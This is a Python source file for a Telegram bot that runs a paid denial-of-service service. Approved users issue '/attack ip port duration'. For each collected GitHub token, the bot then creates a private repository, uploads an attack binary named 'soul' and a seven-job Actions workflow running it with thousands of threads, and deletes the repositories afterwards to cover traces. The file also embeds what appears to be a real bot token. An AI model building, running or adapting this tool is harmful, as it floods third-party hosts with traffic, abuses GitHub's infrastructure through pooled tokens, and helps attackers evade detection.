import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("7417447399:AAEfha3uQ6KI5vBD7BMtkF2MOaGTJcSJGTc")
DEVELOPER_TAG = "Devil😈"

# Owner and admin control
OWNER_IDS = {6137914349}
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.txt"
TOKENS_STATUS_FILE = "tokens.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
DEFAULT_THREADS_FILE = "threads.json"

# Track running attacks per chat
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}

# ---------------- Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def rand_repo_name(prefix="soul-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    wf = {
        "name": "Matrix 7 runs",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run soul", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    r = requests.post(
        "https://api.github.com/user/repos",
        headers=gh_headers(token),
        json={"name": name, "private": True, "auto_init": False},
        timeout=30
    )
    return r.json() if r.status_code in (201, 202) else None

def gh_delete_repo(token: str, full_name: str) -> bool:
    r = requests.delete(
        f"https://api.github.com/repos/{full_name}",
        headers=gh_headers(token),
        timeout=30
    )
    return r.status_code == 204

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    b64 = base64.b64encode(content_bytes).decode()
    r = requests.put(
        f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
        headers=gh_headers(token),
        json={"message": message, "content": b64},
        timeout=30
    )
    return r.status_code in (201, 200)

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    r = requests.post(
        f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
        headers=gh_headers(token),
        json={"ref": ref},
        timeout=30
    )
    return r.status_code in (204, 201)

def validate_github_token(token: str) -> bool:
    r = requests.get(
        "https://api.github.com/user",
        headers=gh_headers(token),
        timeout=20
    )
    return r.status_code == 200

def save_token_line(uid: int, token: str) -> None:
    with open(TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

# NEW: Load tokens for specific user
def load_user_tokens(user_id: int) -> List[str]:
    lines = load_all_token_lines()
    return [ln.split(":", 1)[1] for ln in lines if ln.startswith(f"{user_id}:")]

# NEW: Load admin tokens for user attacks
def load_admin_tokens_for_user(user_id: int) -> List[str]:
    """Get admin tokens that can be used by approved users"""
    lines = load_all_token_lines()
    admin_tokens = []
    for line in lines:
        try:
            uid, token = line.split(":", 1)
            if is_admin(int(uid)) and validate_github_token(token):
                admin_tokens.append(token)
        except:
            continue
    return admin_tokens

def set_status(chat_id: int, running: bool, until: Optional[datetime], repos: Optional[List[str]]) -> None:
    ATTACK_STATUS[chat_id] = {"running": running, "until": until, "repos": repos}

def get_status(chat_id: int) -> Dict[str, Any]:
    return ATTACK_STATUS.get(chat_id, {"running": False, "until": None, "repos": []})

async def animate_progress(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, frames: List[str], delay: float = 0.4):
    msg = await context.bot.send_message(chat_id=chat_id, text=text)
    for fr in frames:
        await asyncio.sleep(delay)
        try:
            await msg.edit_text(fr)
        except Exception:
            pass
    return msg

def anime_gif_url() -> str:
    return "https://media.tenor.com/2RoHfo7f0hUAAAAC/anime-wave.gif"

# ---------------- Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    frames = [
        "▰▱▱▱▱▱▱▱ 12%",
        "▰▰▱▱▱▱▱▱ 25%",
        "▰▰▰▱▱▱▱▱ 37%",
        "▰▰▰▰▱▱▱▱ 50%",
        "▰▰▰▰▰▱▱▱ 62%",
        "▰▰▰▰▰▰▱▱ 75%",
        "▰▰▰▰▰▰▰▱ 87%",
        "▰▰▰▰▰▰▰▰ 100%"
    ]
    msg = await animate_progress(context, chat_id, "Launching…", [f"Loading {f}" for f in frames], 0.35)
    welcome = f"Welcome! Use this bot to orchestrate ephemeral GitHub Actions runs.\nDeveloper: {DEVELOPER_TAG}"
    try:
        await msg.edit_text(welcome)
    except Exception:
        await context.bot.send_message(chat_id=chat_id, text=welcome)
    try:
        await context.bot.send_animation(chat_id=chat_id, animation=anime_gif_url(), caption="Menu ready.")
    except Exception:
        pass

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Admin panel ⚙️", callback_data="admin_panel")]])
        text = (
            "Commands:\n"
            "🔹 /start, /help, /ping, /status\n"
            "🔹 /settoken - send GitHub PAT (text or .txt)\n"
            "🔹 /attack ip port duration - approved only\n"
            "🔹 /users, /check, /add userid days, /remove userid\n"
            "🔹 /threads N, /file (upload 'soul')\n"
            "🔹 Owner: /addadmin userid, /removeadmin userid"
        )
        await update.message.reply_text(text, reply_markup=kb)
    else:
        text = (
            "Commands:\n"
            "🔹 /start, /help, /ping, /status\n"
            "🔹 /settoken - send GitHub PAT (text or .txt)\n"
            "🔹 /attack ip port duration - approved only"
        )
        await update.message.reply_text(text)
    try:
        await context.bot.send_animation(chat_id=update.effective_chat.id, animation=anime_gif_url(), caption="Your menu.")
    except Exception:
        pass

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.data == "admin_panel":
        await q.edit_message_text(
            "Admin Panel:\n"
            "🔹 /add userid days, /remove userid\n"
            "🔹 /threads N, /file, /users, /check\n"
            "🔹 Owner: /addadmin userid, /removeadmin userid"
        )

async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    t0 = time.time()
    msg = await update.message.reply_text("Pinging…")
    dt = int((time.time() - t0) * 1000)
    try:
        await msg.edit_text(f"🛡️ Pong: {dt} ms")
    except Exception:
        pass

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    st = get_status(update.effective_chat.id)
    if st["running"]:
        endt = st["until"].isoformat() if st["until"] else "unknown"
        repo_count = len(st["repos"]) if st["repos"] else 0
        await update.message.reply_text(f"{repo_count} attack(s) running. Ends around: {endt}")
    else:
        await update.message.reply_text("❌ No attack running.")

# MODIFIED: /settoken now admin-only
async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
        
    # .txt document
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        file = await update.message.document.get_file()
        path = await file.download_to_drive()
        cnt = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                tok = line.strip()
                if tok:
                    save_token_line(uid, tok)
                    cnt += 1
        os.remove(path)
        msg = await update.message.reply_text(f"Saved {cnt} token(s). Preparing setup…")
    else:
        # token(s) as text
        text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""
        if not text:
            await update.message.reply_text("Send the PAT in one message or upload a .txt (one token per line).")
            return
        tokens = [t.strip() for t in text.split() if t.strip()]
        for tok in tokens:
            save_token_line(uid, tok)
        msg = await update.message.reply_text(f"Saved {len(tokens)} token(s). Setting up…")

    # progress animation
    frames = ["Creating repo ▰▱▱", "Adding binary ▰▰▱", "Ready ▰▰▰"]
    for fr in frames:
        await asyncio.sleep(0.6)
        try:
            await msg.edit_text(fr)
        except Exception:
            pass
    try:
        await msg.edit_text("⚔️ Setup complete. Tokens saved for user attacks.")
    except Exception:
        pass

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if not os.path.exists(USERS_FILE):
        save_json(USERS_FILE, {})
    await update.message.reply_document(InputFile(USERS_FILE))

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = await update.message.reply_text("Checking tokens…")
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text("Checking tokens ▰▱▱")
    except Exception:
        pass

    lines = load_all_token_lines()
    if is_admin(uid):
        results = {}
        for i, line in enumerate(lines, 1):
            u, tok = line.split(":", 1)
            alive = validate_github_token(tok)
            results.setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
            if i % 5 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(lines)}")
                except Exception:
                    pass
        save_json(TOKENS_STATUS_FILE, results)
        await update.message.reply_document(InputFile(TOKENS_STATUS_FILE))
        try:
            await msg.edit_text("Done.")
        except Exception:
            pass
    else:
        # per-user summary
        own = [ln for ln in lines if ln.startswith(f"{uid}:")]
        live = dead = 0
        rows = []
        for i, line in enumerate(own, 1):
            _, tok = line.split(":", 1)
            ok = validate_github_token(tok)
            if ok:
                live += 1
                rows.append(f"{tok[:12]}…: ✅ live")
            else:
                dead += 1
                rows.append(f"{tok[:12]}…: ❌ dead")
            if i % 4 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(own)}")
                except Exception:
                    pass
        final_text = "Your tokens:\n" + "\n".join(rows) + f"\n\nLive: {live}, Dead: {dead}"
        try:
            await msg.edit_text(final_text)
        except Exception:
            await update.message.reply_text(final_text)

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /add userid days")
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])
        add_user(target, days)
        await update.message.reply_text(f"Approved {target} for {days} days.")
    except ValueError:
        await update.message.reply_text("Invalid userid or days. Both must be integers.")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove userid")
        return
    try:
        target = int(context.args[0])
        remove_user(target)
        await update.message.reply_text(f"Removed {target}.")
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin userid")
        return
    try:
        target = int(context.args[0])
        add_admin(target)
        await update.message.reply_text(f"Added admin {target}.")
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin userid")
        return
    try:
        target = int(context.args[0])
        remove_admin(target)
        await update.message.reply_text(f"Removed admin {target}.")
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if not context.args:
        await update.message.reply_text("Usage: /threads 4000")
        return
    try:
        val = int(context.args[0])
        set_default_threads(val)
        await update.message.reply_text(f"Default threads set to {val}.")
    except ValueError:
        await update.message.reply_text("Invalid number.")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    await update.message.reply_text(f"Upload binary named '{BINARY_NAME}' now.")

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        return
    if doc.file_name == BINARY_NAME:
        if os.path.exists(BINARY_PATH):
            os.remove(BINARY_PATH)
        f = await doc.get_file()
        await f.download_to_drive(custom_path=BINARY_PATH)
        await update.message.reply_text(f"Binary '{BINARY_NAME}' saved to script directory.")

# MODIFIED: /attack now uses admin tokens for approved users
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_user_approved(uid):
        await update.message.reply_text(f"❌ You are not authorised. Message your father {DEVELOPER_TAG}")
        return
    if len(context.args) != 3:
        await update.message.reply_text("✨ Usage format: /attack <ip> <port> <duration_in_second>")
        return
    ip, port, duration = context.args
    try:
        int(port)
        int(duration)
    except ValueError:
        await update.message.reply_text("Port and duration must be integers.")
        return
    if not os.path.exists(BINARY_PATH):
        await update.message.reply_text(f"Binary '{BINARY_NAME}' not found. Admin must upload via /file.")
        return

    # NEW: Get tokens - user's own tokens + admin tokens
    user_tokens = load_user_tokens(uid)  # User's own tokens
    admin_tokens = load_admin_tokens_for_user(uid)  # Admin tokens for approved users
    
    # Combine all available tokens
    all_tokens = user_tokens + admin_tokens
    valid_tokens = [t for t in all_tokens if validate_github_token(t)]
    
    if not valid_tokens:
        await update.message.reply_text("❌ No valid GitHub tokens found. Ask admin to add tokens via /settoken.")
        return

    msg = await update.message.reply_text(f"Starting attack with {len(valid_tokens)} token(s)…")
    threads = get_default_threads()
    wf_text = build_matrix_workflow_yaml(ip, port, duration, threads).encode()
    repos = []
    failed_tokens = []

    # Process each valid token
    for token in valid_tokens:
        try:
            # Create repository
            await msg.edit_text(f"Creating repository for token {token[:10]}…")
            name = rand_repo_name()
            repo_data = gh_create_repo(token, name)
            if not repo_data:
                failed_tokens.append(token[:10] + "…")
                continue
            full_name = repo_data["full_name"]
            owner, repo = full_name.split("/", 1)
            repos.append((token, full_name))

            # Upload workflow
            await msg.edit_text(f"Uploading workflow for {full_name}…")
            ok_wf = gh_put_file(token, owner, repo, ".github/workflows/run.yml", wf_text, "Add workflow")
            if not ok_wf:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            # Upload binary
            await msg.edit_text(f"Uploading binary for {full_name}…")
            with open(BINARY_PATH, "rb") as bf:
                soul_bytes = bf.read()
            ok_bin = gh_put_file(token, owner, repo, BINARY_NAME, soul_bytes, "Add binary")
            if not ok_bin:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            # Dispatch workflow
            await msg.edit_text(f"Dispatching workflow for {full_name}…")
            if not gh_dispatch_workflow(token, owner, repo, "run.yml", "main"):
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

        except Exception as e:
            failed_tokens.append(token[:10] + "…")
            await msg.edit_text(f"Error with token {token[:10]}…: {str(e)}")
            continue

    if not repos:
        await msg.edit_text(f"Failed to start attack: No successful setups. Failed tokens: {', '.join(failed_tokens) or 'None'}")
        return

    # Mark running status
    until = datetime.utcnow() + timedelta(seconds=int(duration) + 15)
    set_status(chat_id, True, until, [r[1] for r in repos])
    started = f"🔥 Attack started on {ip}:{port} for {duration}s with {len(repos)} token(s) 💀"
    try:
        await msg.edit_text(started)
    except Exception:
        await update.message.reply_text(started)

    # Progress updates during duration
    total = int(duration)
    ticks = max(1, total // 5)
    for i in range(1, 6):
        await asyncio.sleep(ticks)
        try:
            await msg.edit_text(f"Running… {ip}:{port} ~{i * 20}% ({len(repos)} repos)")
        except Exception:
            pass

    # Finished
    try:
        await msg.edit_text(f"👍 Attack finished. Used {len(repos)} token(s). Failed: {', '.join(failed_tokens) or 'None'}")
    except Exception:
        await update.message.reply_text(f"✨ Attack finished. Used {len(repos)} token(s). Failed: {', '.join(failed_tokens) or 'None'}")

    # Cleanup repos
    for token, full_name in repos:
        try:
            gh_delete_repo(token, full_name)
        except Exception:
            pass
    set_status(chat_id, False, None, [])

# ---- Wire application ----
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("settoken", cmd_settoken))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    return app

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    app = build_app()
    app.run_polling()